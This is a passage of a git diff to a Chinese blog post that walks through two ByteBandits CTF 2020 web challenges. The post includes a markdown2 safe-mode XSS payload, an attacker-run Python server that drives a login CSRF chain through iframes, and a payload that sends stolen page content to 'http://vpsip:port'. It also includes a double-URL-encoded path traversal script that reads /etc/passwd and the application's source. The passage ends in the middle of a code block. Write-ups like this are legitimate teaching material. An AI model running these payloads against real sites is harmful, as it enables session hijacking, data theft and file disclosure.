@@ -467,51 +467,245 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <h2 id="NotesAPP"><a href="#NotesAPP" class="headerlink" title="NotesAPP"></a>NotesAPP</h2><p>这题复现的话有一个问题,就是要改下源码。一个是改bot的访问地址。再一个就是因为里面用了Googlecaptchakey,所以得换。但是我给自己的vps申请的key换了后还是不顶用。索性把相关的html跟python代码删掉了,姑且是能做了hhh.</p>
 <p>首先题目给了源码。现在可以到官方github上看<a href="https://github.com/ByteBandits/bbctf-2020/tree/master/web/notes" target="_blank" rel="noopener">https://github.com/ByteBandits/bbctf-2020/tree/master/web/notes</a></p>
 <p>简单审计后首先注意到一个markdown xss</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route("/profile")</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">profile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"profile.html"</span>, current_user = current_user)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/update_notes", methods=["POST"])</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_notes</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> current_user.id == <span class="string">'admin'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Nope."</span></span><br><span class="line">    <span class="comment"># markdown support!!</span></span><br><span class="line">    current_user.notes = markdown2.markdown(request.form.get(<span class="string">'notes'</span>), safe_mode = <span class="literal">True</span>)</span><br><span class="line">    db.session.commit()</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">"/profile"</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">@app.route(&quot;/profile&quot;)
+@login_required
+def profile():
+    return render_template(&quot;profile.html&quot;, current_user = current_user)
 
+@app.route(&quot;/update_notes&quot;, methods=[&quot;POST&quot;])
+@login_required
+def update_notes():
+    if current_user.id == &#39;admin&#39;:
+        return &quot;Nope.&quot;
+    # markdown support!!
+    current_user.notes = markdown2.markdown(request.form.get(&#39;notes&#39;), safe_mode = True)
+    db.session.commit()
+    return redirect(&quot;/profile&quot;)</code></pre>
 <p>登录进去后在/profile路由即可updatemarkdown内容。这里自然想到markdownxss。不过当时尝试了下并没有打出来。<br>因为这里用到的是markdown2这个库的safe_mode。html标签都会直接转义。<br>后来发现用到的是github上的一个issue.<br><a href="https://github.com/trentm/python-markdown2/issues/341" target="_blank" rel="noopener">https://github.com/trentm/python-markdown2/issues/341</a><br>safe_mode或者escape都有对应的xsspayload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;http:&#x2F;&#x2F;g&lt;!s:&#x2F;&#x2F;q?&lt;!-&lt;[&lt;script&gt;alert(1);&#x2F;\*](http:&#x2F;&#x2F;g)-&gt;a&gt;&lt;http:&#x2F;&#x2F;g&lt;!s:&#x2F;&#x2F;g.c?&lt;!-&lt;[a\\*&#x2F;&lt;&#x2F;script&gt;alert(1);&#x2F;*](http:&#x2F;&#x2F;g)-&gt;a&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>得到一个self-xss.</p>
+<pre><code>&lt;http://g&lt;!s://q?&lt;!-&lt;[&lt;script&gt;alert(1);/\*](http://g)-&gt;a&gt;&lt;http://g&lt;!s://g.c?&lt;!-&lt;[a\\*/&lt;/script&gt;alert(1);/*](http://g)-&gt;a&gt;</code></pre><p><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>得到一个self-xss.</p>
 <p>得到self-xss的第一步就是应该考虑如何提升xss的危害性。因为我们的题目还有一处<code>/send_link</code>路由明显是提交url后让bot进行访问。那么这里可能需要考虑csrf。<br>因为只有admin登录访问profile会得到flag。我们访问自己的profile只能得到自己的内容。<br>传统的CSRF一定是遵循以下原则的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.登录受信任网站A，并在本地生成Cookie。</span><br><span class="line">2.在不登出A的情况下，访问危险网站B。</span><br></pre></td></tr></table></figure>
-<p>那么基于此题bot的存在,我们大概的流程是：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.让bot访问profile,此时存在flag</span><br><span class="line">2.logout</span><br><span class="line">3.登录构造好payload的用户，并加载payload.得到admin的信息</span><br></pre></td></tr></table></figure>
-<p>但是存在几个细节：<br>如何控制bot登出并登录？<br>如何让我们的payload能够得到admin页面的信息？</p>
+<pre><code>1.登录受信任网站A，并在本地生成Cookie。
+2.在不登出A的情况下，访问危险网站B。</code></pre><p>那么基于此题bot的存在,我们大概的流程是：</p>
+<pre><code>1.让bot访问profile,此时存在flag
+2.logout
+3.登录构造好payload的用户，并加载payload.得到admin的信息</code></pre><p>但是存在几个细节：<br>如何控制bot登出并登录？<br>如何让我们的payload能够得到admin页面的信息？</p>
 <p>仔细观察发现一个细节。当我们注册时,用户名与密码通过post方式请求。但是当我们登出再登录时，却是通过get请求进行登录。<br>因此先登出再登录的细节就解决了。<br>至于加载admin的信息，使用到的自然是经典的iframe xss 。原来总结CSP时用过。经典的利用就是：<br>一个同源页面，一个是CSP保护的flag页面A，一个是存在xss的页面B。只需要一个iframe就能窃取到flag.</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">iframe.src=<span class="string">"A页面"</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>alert(iframe.contentWindow.document.getElementById(<span class="string">'flag'</span>).innerHTML),<span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">var iframe = document.createElement(&#39;iframe&#39;);
+iframe.src=&quot;A页面&quot;;
+document.body.appendChild(iframe);
+setTimeout(()=&gt;alert(iframe.contentWindow.document.getElementById(&#39;flag&#39;).innerHTML),1000);</code></pre>
 <p>此题并没有对iframe的限制。自然是可行的</p>
 <p>所以构思后我们的payload应该是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.提交url,让bot访问我们vps上的内容</span><br><span class="line">2.先加载一个iframe去访问profile并登出</span><br><span class="line">3.再加载一个iframe，通过url直接登录我们自建账号。触发payload</span><br></pre></td></tr></table></figure>
+<pre><code>1.提交url,让bot访问我们vps上的内容
+2.先加载一个iframe去访问profile并登出
+3.再加载一个iframe，通过url直接登录我们自建账号。触发payload</code></pre><p>然而这题有个坑 注意到visit_link.py中</p>
+<pre><code class="python">import asyncio
+from pyppeteer import launch
+from redis import Redis
+from rq import Queue
+import os
+import psutil, signal
 
-<p>然而这题有个坑 注意到visit_link.py中</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> pyppeteer <span class="keyword">import</span> launch</span><br><span class="line"><span class="keyword">from</span> redis <span class="keyword">import</span> Redis</span><br><span class="line"><span class="keyword">from</span> rq <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> psutil, signal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(url)</span>:</span></span><br><span class="line">    browser = <span class="keyword">await</span> launch(headless=<span class="literal">True</span>,</span><br><span class="line">                           executablePath=<span class="string">"/usr/bin/chromium-browser"</span>,</span><br><span class="line">                           args=[<span class="string">'--no-sandbox'</span>, <span class="string">'--disable-gpu'</span>])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line">        <span class="keyword">await</span> page.goto(<span class="string">"https://notes.web.byteband.it/login"</span>)</span><br><span class="line">        <span class="keyword">await</span> page.type(<span class="string">"input[name='username']"</span>, <span class="string">"admin"</span>)</span><br><span class="line">        <span class="keyword">await</span> page.type(<span class="string">"input[name='password']"</span>, os.environ.get(<span class="string">"ADMIN_PASS"</span>))</span><br><span class="line">        <span class="keyword">await</span> asyncio.wait([</span><br><span class="line">            page.click(<span class="string">'button'</span>),</span><br><span class="line">            page.waitForNavigation(),</span><br><span class="line">        ])</span><br><span class="line"></span><br><span class="line">        newPage = <span class="keyword">await</span> browser.newPage()</span><br><span class="line">        <span class="keyword">await</span> newPage.goto(url)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">await</span> browser.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit_url</span><span class="params">(url)</span>:</span></span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main(url))</span><br><span class="line"></span><br><span class="line">q = Queue(connection=Redis(host=<span class="string">'redis'</span>))</span><br></pre></td></tr></table></figure>
+
+async def main(url):
+    browser = await launch(headless=True,
+                           executablePath=&quot;/usr/bin/chromium-browser&quot;,
+                           args=[&#39;--no-sandbox&#39;, &#39;--disable-gpu&#39;])
+    try:
+        page = await browser.newPage()
+        await page.goto(&quot;https://notes.web.byteband.it/login&quot;)
+        await page.type(&quot;input[name=&#39;username&#39;]&quot;, &quot;admin&quot;)
+        await page.type(&quot;input[name=&#39;password&#39;]&quot;, os.environ.get(&quot;ADMIN_PASS&quot;))
+        await asyncio.wait([
+            page.click(&#39;button&#39;),
+            page.waitForNavigation(),
+        ])
+
+        newPage = await browser.newPage()
+        await newPage.goto(url)
+    except Exception as e:
+        raise e
+    finally:
+        await browser.close()
+
+
+def visit_url(url):
+    asyncio.get_event_loop().run_until_complete(main(url))
+
+q = Queue(connection=Redis(host=&#39;redis&#39;))</code></pre>
 <p>这串异步代码让admin只要访问了后立即退出。也就是说我们的payload并不会有时间触发。</p>
 <p>因此需要额外设计，比如起一个flask控制bot访问时进行停顿，这样就有时间触发payload了。<br>下面是dalao的脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler,HTTPServer</span><br><span class="line"></span><br><span class="line">PORT_NUMBER = <span class="number">8877</span></span><br><span class="line"></span><br><span class="line">SERVER = <span class="string">"https://notes.web.byteband.it"</span></span><br><span class="line"></span><br><span class="line">USERNAME = <span class="string">"abc"</span></span><br><span class="line">PASSWORD = <span class="string">"123"</span></span><br><span class="line"></span><br><span class="line">EXPLOIT = <span class="string">"""</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;script type='text/javascript'&gt;</span></span><br><span class="line"><span class="string">function loginUser() &#123;&#123;</span></span><br><span class="line"><span class="string">    var iframe = document.createElement('iframe');</span></span><br><span class="line"><span class="string">    iframe.style.display = "none";</span></span><br><span class="line"><span class="string">    iframe.src = "&#123;server&#125;/login?username=&#123;username&#125;&amp;password=&#123;password&#125;";</span></span><br><span class="line"><span class="string">    iframe.sandbox = "allow-same-origin allow-scripts";</span></span><br><span class="line"><span class="string">    document.body.appendChild(iframe);</span></span><br><span class="line"><span class="string">&#125;&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function logoutUser() &#123;&#123;</span></span><br><span class="line"><span class="string">    var iframe = document.createElement('iframe');</span></span><br><span class="line"><span class="string">    iframe.style.display = "none";</span></span><br><span class="line"><span class="string">    iframe.onload = loginUser;</span></span><br><span class="line"><span class="string">    iframe.src = "&#123;server&#125;/logout";</span></span><br><span class="line"><span class="string">    iframe.sandbox = "allow-same-origin allow-scripts";</span></span><br><span class="line"><span class="string">    document.body.appendChild(iframe);</span></span><br><span class="line"><span class="string">&#125;&#125;;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;iframe id="iframe01" name="iframe01" src="&#123;server&#125;/profile" sandbox="allow-same-origin allow-scripts" onload="logoutUser(this)"&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">"""</span>.format(server=SERVER, username=USERNAME, password=PASSWORD)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyServer</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.send_header(<span class="string">"Content-type"</span>, <span class="string">"text/html"</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        self.wfile.write(EXPLOIT.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        time.sleep(<span class="number">10</span>)  <span class="comment"># keep open for some time for exploit to finish</span></span><br><span class="line"></span><br><span class="line">myServer = HTTPServer((<span class="string">"0.0.0.0"</span>, PORT_NUMBER), MyServer)</span><br><span class="line">print(time.asctime(), <span class="string">"Server Starts - %s:%s"</span> % (<span class="string">"0.0.0.0"</span>, PORT_NUMBER))</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    myServer.serve_forever()</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">myServer.server_close()</span><br><span class="line">print(time.asctime(), <span class="string">"Server Stops - %s:%s"</span> % (<span class="string">"0.0.0.0"</span>, PORT_NUMBER))</span><br></pre></td></tr></table></figure>
-<p>从这行代码就能看出主要流程跟之前构思的思路是一致的。<br><code>&lt;iframe id=&quot;iframe01&quot; name=&quot;iframe01&quot; src=&quot;{server}/profile&quot; sandbox=&quot;allow-same-origin allow-scripts&quot; onload=&quot;logoutUser(this)&quot;&gt;&lt;/iframe&gt;</code><br>主要就是要sleep10s.<br>在vps上运行。然后我们用自己的abc用户updatepayload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;http:&#x2F;&#x2F;g&lt;!s:&#x2F;&#x2F;q?&lt;!-&lt;[&lt;script&gt;(new Image).src &#x3D; &#39;http:&#x2F;&#x2F;vpsip:port&#x2F;?data&#x3D;&#39; + escape(parent.frames[&#39;iframe01&#39;].document.body.getElementsByClassName(&quot;hero-body&quot;)[0].innerText);&#x2F;\*](http:&#x2F;&#x2F;g)-&gt;a&gt;&lt;http:&#x2F;&#x2F;g&lt;!s:&#x2F;&#x2F;g.c?&lt;!-&lt;[a\\*&#x2F;&lt;&#x2F;script&gt;alert(1);&#x2F;*](http:&#x2F;&#x2F;g)-&gt;a&gt;</span><br></pre></td></tr></table></figure>
-<p>起到窃取iframe内容的作用,获取的内容源自hero-body这个class的内容。<br>最后url提交<code>vpsip:port</code>即可<br><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/flag1.PNG" class="lazyload" data-srcset="flag1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>解码即可发现flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Howdy admin!</span><br><span class="line">flag&#123;ch41n_tHy_3Xploits_t0_w1n&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#!/usr/bin/env python3
 
-<h2 id="ImgAccess2"><a href="#ImgAccess2" class="headerlink" title="ImgAccess2"></a>ImgAccess2</h2><p>这题很有营养。首先上来一个文件上传。根据题意只能是图片,同时上传后进入到upload路由,并能通过<code>/view/md5.../filename</code>访问到自己的图片</p>
+import time
+
+from http.server import BaseHTTPRequestHandler,HTTPServer
+
+PORT_NUMBER = 8877
+
+SERVER = &quot;https://notes.web.byteband.it&quot;
+
+USERNAME = &quot;abc&quot;
+PASSWORD = &quot;123&quot;
+
+EXPLOIT = &quot;&quot;&quot;
+&lt;html&gt;
+&lt;body&gt;
+&lt;script type=&#39;text/javascript&#39;&gt;
+function loginUser() {{
+    var iframe = document.createElement('iframe');
+    iframe.style.display = "none";
+    iframe.src = "{server}/login?username={username}&password={password}";
+    iframe.sandbox = "allow-same-origin allow-scripts";
+    document.body.appendChild(iframe);
+}};
+
+function logoutUser() {{
+    var iframe = document.createElement('iframe');
+    iframe.style.display = "none";
+    iframe.onload = loginUser;
+    iframe.src = "{server}/logout";
+    iframe.sandbox = "allow-same-origin allow-scripts";
+    document.body.appendChild(iframe);
+}};
+&lt;/script&gt;
+&lt;iframe id=&quot;iframe01&quot; name=&quot;iframe01&quot; src=&quot;{server}/profile&quot; sandbox=&quot;allow-same-origin allow-scripts&quot; onload=&quot;logoutUser(this)&quot;&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&quot;&quot;&quot;.format(server=SERVER, username=USERNAME, password=PASSWORD)
+
+
+class MyServer(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header(&quot;Content-type&quot;, &quot;text/html&quot;)
+        self.end_headers()
+        self.wfile.write(EXPLOIT.encode(&#39;utf-8&#39;))
+        time.sleep(10)  # keep open for some time for exploit to finish
+
+myServer = HTTPServer((&quot;0.0.0.0&quot;, PORT_NUMBER), MyServer)
+print(time.asctime(), &quot;Server Starts - %s:%s&quot; % (&quot;0.0.0.0&quot;, PORT_NUMBER))
+
+try:
+    myServer.serve_forever()
+except KeyboardInterrupt:
+    pass
+
+myServer.server_close()
+print(time.asctime(), &quot;Server Stops - %s:%s&quot; % (&quot;0.0.0.0&quot;, PORT_NUMBER))</code></pre>
+<p>从这行代码就能看出主要流程跟之前构思的思路是一致的。<br><code>&lt;iframe id=&quot;iframe01&quot; name=&quot;iframe01&quot; src=&quot;{server}/profile&quot; sandbox=&quot;allow-same-origin allow-scripts&quot; onload=&quot;logoutUser(this)&quot;&gt;&lt;/iframe&gt;</code><br>主要就是要sleep10s.<br>在vps上运行。然后我们用自己的abc用户updatepayload</p>
+<pre><code>&lt;http://g&lt;!s://q?&lt;!-&lt;[&lt;script&gt;(new Image).src = &#39;http://vpsip:port/?data=&#39; + escape(parent.frames[&#39;iframe01&#39;].document.body.getElementsByClassName(&quot;hero-body&quot;)[0].innerText);/\*](http://g)-&gt;a&gt;&lt;http://g&lt;!s://g.c?&lt;!-&lt;[a\\*/&lt;/script&gt;alert(1);/*](http://g)-&gt;a&gt;</code></pre><p>起到窃取iframe内容的作用,获取的内容源自hero-body这个class的内容。<br>最后url提交<code>vpsip:port</code>即可<br><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/flag1.PNG" class="lazyload" data-srcset="flag1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>解码即可发现flag</p>
+<pre><code>Howdy admin!
+flag{ch41n_tHy_3Xploits_t0_w1n}</code></pre><h2 id="ImgAccess2"><a href="#ImgAccess2" class="headerlink" title="ImgAccess2"></a>ImgAccess2</h2><p>这题很有营养。首先上来一个文件上传。根据题意只能是图片,同时上传后进入到upload路由,并能通过<code>/view/md5.../filename</code>访问到自己的图片</p>
 <p>那么当然要考虑文件上传getshell了。但是首先注意到,从题目的路由与cookie明显提醒我们这是python起的web服务。但是同时访问404时出现的是类似apache的404页面</p>
 <p>并且路径上出现的是/view/xxxx而不是upload/xxxxx,也就意味着，我们需要找出真正的上传路径</p>
 <p>尝试upload/xxx/1.jpg发现返回404<br><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>但是将upload改为uploads时发现可以访问到我们的上传图片了。</p>
 <p>因此确定，真实的上传路径是uploads且可以访问到。<br>此时考虑是否能利用这个路径做些文章</p>
 <p>相对容易想到的应该是路径穿越了，但尝试构造普通路径穿越失败。<br>不过路径穿越还有一种相对比较熟悉的绕过姿势。比如urlencode两次的路径穿越,(phpmyadmin4.8.1就曾出现过)<br>那么此处尝试对路径穿越进行二次url编码<br><code>../../../../../etc/passwd</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus <span class="keyword">as</span> urlencode</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://xxxxxxx:7003/uploads/'</span></span><br><span class="line"></span><br><span class="line">filepath=<span class="string">'../../../../../../etc/passwd'</span></span><br><span class="line">filepath=urlencode(filepath)</span><br><span class="line">filepath=urlencode(filepath)</span><br><span class="line">r=requests.get(url+filepath)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import requests
+from urllib.parse import quote_plus as urlencode
 
+url=&#39;http://xxxxxxx:7003/uploads/&#39;
+
+filepath=&#39;../../../../../../etc/passwd&#39;
+filepath=urlencode(filepath)
+filepath=urlencode(filepath)
+r=requests.get(url+filepath)
+print(r.text)
+</code></pre>
 <p>发现成功读取了/etc/passwd<br><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>接下来肯定是想要得到其他有用信息了，比如app.py的源码<br>想先读<code>/proc/self/environ</code>,发现没内容。但是不要紧，此时必然可行的方法是利用<code>/proc/self/cwd</code>指向当前工作目录的特性，直接读取app.py<br><code>/proc/self/cwd/app.py</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, flash, redirect, send_file</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = 